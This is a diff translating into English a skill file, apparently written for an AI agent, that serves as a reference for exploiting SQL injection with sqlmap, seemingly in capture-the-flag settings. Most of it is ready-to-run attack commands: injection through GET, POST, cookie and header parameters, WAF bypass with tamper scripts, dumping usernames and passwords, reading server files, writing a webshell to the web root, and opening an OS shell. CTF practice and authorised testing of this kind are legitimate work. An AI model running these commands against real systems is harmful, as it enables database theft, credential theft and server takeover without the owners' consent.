@@ -1,33 +1,35 @@
 ---
 name: sqlmap-advanced
-description: "sqlmap 高级用法完整参考。当确认存在 SQL 注入需要用 sqlmap 自动化利用时使用。覆盖 POST/Cookie/Header 注入、tamper 脚本选择、--technique 精确控制、二次注入、OS shell/文件读写、数据库提取优化"
+description: "Complete reference for advanced sqlmap usage. Use when a SQL injection is confirmed and automated exploitation with sqlmap is needed. Covers POST/Cookie/Header injection, tamper script selection, precise --technique control, second-order injection, OS shell/file read-write, and database extraction optimization"
+zh-signals: "sqlmap 高级用法参考，覆盖多位置注入、tamper 脚本、OS Shell、文件读写与数据库提取优化。信号:sqlmap,SQL注入,tamper,WAF绕过,OS Shell"
+when-to-use: "Use when a SQL injection is confirmed and you need automated exploitation via sqlmap across GET/POST/Cookie/Header injection points, tamper selection, OS shell, or file read/write."
 metadata:
-  tags: "sqlmap,sql injection,tool,tamper,bypass,waf,os-shell,file-read,file-write,数据库,注入工具"
+  tags: "sqlmap,sql injection,tool,tamper,bypass,waf,os-shell,file-read,file-write,database,injection-tool"
   category: "tool"
 ---
 
-# sqlmap 高级用法完整参考
+# Complete Reference for Advanced sqlmap Usage
 
-## 超时控制（强制执行）
+## Timeout Control (mandatory)
 
-sqlmap 可能运行很长时间。**必须用 timeout 包裹**：
+sqlmap may run for a long time. **It must be wrapped with timeout**:
 
 ```bash
-timeout 480 sqlmap [参数] --batch 2>&1 | tee /tmp/sqlmap_output.log
-# 超时后立即查看已有结果
+timeout 480 sqlmap [options] --batch 2>&1 | tee /tmp/sqlmap_output.log
+# After the timeout, immediately inspect the results obtained so far
 tail -80 /tmp/sqlmap_output.log
 ```
 
-## 深入参考
+## Further Reading
 
-- tamper 脚本速查表 → [references/tamper-reference.md](references/tamper-reference.md)
-- 高级用法详细命令（OS Shell/文件读写/二次注入/性能调优） → [references/advanced-usage.md](references/advanced-usage.md)
+- Tamper script quick reference → [references/tamper-reference.md](references/tamper-reference.md)
+- Detailed commands for advanced usage (OS shell/file read-write/second-order injection/performance tuning) → [references/advanced-usage.md](references/advanced-usage.md)
 
 ---
 
-## Phase 1: 基础检测
+## Phase 1: Basic Detection
 
-### GET 参数注入
+### GET parameter injection
 
 ```bash
 timeout 480 sqlmap -u 'http://target/page.php?id=1' \
@@ -35,7 +37,7 @@ timeout 480 sqlmap -u 'http://target/page.php?id=1' \
     2>&1 | tee /tmp/sqlmap_output.log
 ```
 
-### POST 参数注入
+### POST parameter injection
 
 ```bash
 timeout 480 sqlmap -u 'http://target/login.php' \
@@ -44,9 +46,9 @@ timeout 480 sqlmap -u 'http://target/login.php' \
     2>&1 | tee /tmp/sqlmap_output.log
 ```
 
-**关键**：`--data` 中包含所有表单字段（尤其 submit 按钮），PHP 常用 `isset($_POST['submit'])` 校验。
+**Key point**: `--data` must contain all form fields (especially the submit button), since PHP commonly validates with `isset($_POST['submit'])`.
 
-### Cookie 注入
+### Cookie injection
 
 ```bash
 timeout 480 sqlmap -u 'http://target/page.php' \
@@ -56,7 +58,7 @@ timeout 480 sqlmap -u 'http://target/page.php' \
     2>&1 | tee /tmp/sqlmap_output.log
 ```
 
-### HTTP Header 注入
+### HTTP header injection
 
 ```bash
 timeout 480 sqlmap -u 'http://target/page.php' \
@@ -66,9 +68,9 @@ timeout 480 sqlmap -u 'http://target/page.php' \
     2>&1 | tee /tmp/sqlmap_output.log
 ```
 
-星号 `*` 标记注入点位置。
+The asterisk `*` marks the position of the injection point.
 
-### 从 Burp 请求文件
+### From a Burp request file
 
 ```bash
 timeout 480 sqlmap -r /tmp/request.txt \
@@ -78,76 +80,76 @@ timeout 480 sqlmap -r /tmp/request.txt \
 
 ---
 
-## Phase 2: --technique 精确控制
+## Phase 2: Precise --technique Control
 
-| 字母 | 技术 | 适用场景 |
+| Letter | Technique | Applicable scenario |
 |------|------|----------|
-| B | Boolean-based blind | 有布尔差异（页面内容变化） |
-| E | Error-based | 有报错回显 |
-| U | UNION query | 有数据回显 |
-| S | Stacked queries | 支持分号（MySQL、MSSQL、PostgreSQL） |
-| T | Time-based blind | 无任何差异（最后手段） |
-| Q | Inline queries | 子查询注入 |
+| B | Boolean-based blind | Boolean differences exist (page content changes) |
+| E | Error-based | Errors are reflected back |
+| U | UNION query | Data is reflected back |
+| S | Stacked queries | Semicolons are supported (MySQL, MSSQL, PostgreSQL) |
+| T | Time-based blind | No difference at all (last resort) |
+| Q | Inline queries | Subquery injection |
 
 ```bash
-# 只用 UNION + Error（最快）
+# Only UNION + Error (fastest)
 sqlmap -u 'URL' --technique EU --batch
 
-# 跳过耗时的时间盲注
+# Skip the time-consuming time-based blind injection
 sqlmap -u 'URL' --technique BEUS --batch
 ```
-
-**建议**：先用 `--technique EU` 快速检测，失败再加 `B`，最后才试 `T`。
+→
+**Recommendation**: first detect quickly with `--technique EU`, add `B` if it fails, and only try `T` last.
 
 ---
 
-## Phase 3: 数据提取
+## Phase 3: Data Extraction
 
 ```bash
-# 1. 列出所有数据库
+# 1. List all databases
 sqlmap -u 'URL' --dbs --batch
 
-# 2. 列出指定库的表
+# 2. List the tables of a given database
 sqlmap -u 'URL' -D target_db --tables --batch
 
-# 3. 列出指定表的列
+# 3. List the columns of a given table
 sqlmap -u 'URL' -D target_db -T users --columns --batch
 
-# 4. 提取数据
+# 4. Extract data
 sqlmap -u 'URL' -D target_db -T users --dump --batch
 
-# 5. 只取特定列
+# 5. Only extract specific columns
 sqlmap -u 'URL' -D target_db -T users -C username,password --dump --batch
 
-# 6. 限制行数（大表时）
+# 6. Limit the number of rows (for large tables)
 sqlmap -u 'URL' -D target_db -T users --dump --start 1 --stop 10 --batch
 
-# 7. 搜索关键表/列
+# 7. Search for key tables/columns
 sqlmap -u 'URL' --search -T flag --batch
 sqlmap -u 'URL' --search -C password --batch
 ```
-
+→
 ---
 
-## 实战速查
+## Practical Quick Reference
 
-| 场景 | 命令关键参数 |
+| Scenario | Key command parameters |
 |------|-------------|
-| 快速检测 | `--technique EU --level 1 --risk 1` |
-| 深度检测 | `--level 5 --risk 3` |
-| POST 表单 | `--data 'param1=val1&param2=val2'` |
-| Cookie 注入 | `--cookie 'x=1' --level 3` |
-| WAF 环境 | `--tamper=space2comment,between --random-agent` |
-| 读 flag 文件 | `--file-read=/flag.txt` |
-| 写 webshell | `--file-write=shell.php --file-dest=/var/www/html/` |
-| 拿系统 shell | `--os-shell` |
-| 二次注入 | `--second-url URL` |
-| 搜索 flag | `--search -T flag` 或 `--search -C flag` |
+| Quick detection | `--technique EU --level 1 --risk 1` |
+| Deep detection | `--level 5 --risk 3` |
+| POST form | `--data 'param1=val1&param2=val2'` |
+| Cookie injection | `--cookie 'x=1' --level 3` |
+| WAF environment | `--tamper=space2comment,between --random-agent` |
+| Read a flag file | `--file-read=/flag.txt` |
+| Write a webshell | `--file-write=shell.php --file-dest=/var/www/html/` |
+| Get a system shell | `--os-shell` |
+| Second-order injection | `--second-url URL` |
+| Search for the flag | `--search -T flag` or `--search -C flag` |
 
-## 注意事项
+## Notes
 
-- `--batch` 自动选择默认答案（必加，agent 无法交互）
-- `--risk 3` 可能执行 UPDATE/DELETE，有风险环境慎用
-- `timeout 480` 最多跑 8 分钟，超时检查已有结果
-- sqlmap 会缓存结果，重跑同目标用 `--flush-session` 清除缓存
-- 如果 sqlmap 检测不到注入但手工确认存在 → 用 `--prefix` 和 `--suffix` 手动指定闭合
+- `--batch` automatically selects default answers (mandatory, the agent cannot interact)
+- `--risk 3` may execute UPDATE/DELETE, so use it with care in risky environments
+- `timeout 480` runs for at most 8 minutes; on timeout, inspect the results obtained so far
+- sqlmap caches results, so use `--flush-session` to clear the cache when re-running against the same target
+- If sqlmap cannot detect the injection but you have manually confirmed it → use `--prefix` and `--suffix` to specify the closure manually
